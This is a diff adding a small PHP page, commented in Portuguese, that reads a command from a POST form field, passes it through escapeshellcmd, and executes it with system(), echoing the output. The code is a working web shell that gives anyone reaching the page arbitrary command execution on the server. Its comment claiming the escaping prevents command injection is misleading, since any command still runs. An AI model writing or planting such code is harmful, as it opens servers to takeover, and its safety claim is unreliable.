@@ -1,0 +1,33 @@
+<?php
+
+// VERIFICA SE O MÉTODO DE REQUISIÇÃO É POST
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+
+	// RECEBE O COMANDO DO USUÁRIO E LIMPA PARA EVITAR INJEÇÕES DE COMANDO
+	$cmd = escapeshellcmd($_POST['cmd']);
+
+	// MOSTRA O COMANDO APÓS SER SANITIZADO
+	var_dump($cmd);
+
+	// INICIA A TAG <PRE> PARA FORMATAR A SAÍDA DO COMANDO
+	echo "<pre>";
+
+	// EXECUTA O COMANDO NO TERMINAL E ARMAZENA O RESULTADO NA VARIÁVEL $comando
+	$comando = system($cmd, $retorno);
+
+	// FINALIZA A TAG <PRE>
+	echo "</pre>";
+
+}
+
+?>
+
+<!-- FORMULÁRIO PARA ENVIO DO COMANDO -->
+<form method="post">
+	
+	<!-- CAMPO DE TEXTO PARA O USUÁRIO INSERIR O COMANDO -->
+	<input type="text" name="cmd">
+	<!-- BOTÃO PARA SUBMETER O FORMULÁRIO -->
+	<button type="submit">Enviar</button>
+
+</form>
